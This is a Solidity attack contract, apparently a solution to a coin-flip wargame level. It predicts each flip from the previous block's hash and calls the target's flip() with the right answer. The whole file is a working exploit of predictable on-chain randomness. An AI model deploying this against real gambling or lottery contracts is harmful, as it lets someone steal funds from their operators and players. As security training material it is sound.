//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./SafeMath.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external pure returns (uint256);
}

contract FlipGuesser {
    using SafeMath for uint256;
    address immutable public coinFlipAddr;
    uint256 immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddr) {
        coinFlipAddr = _coinFlipAddr;
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(coinFlipAddr).flip(side);
    }

}
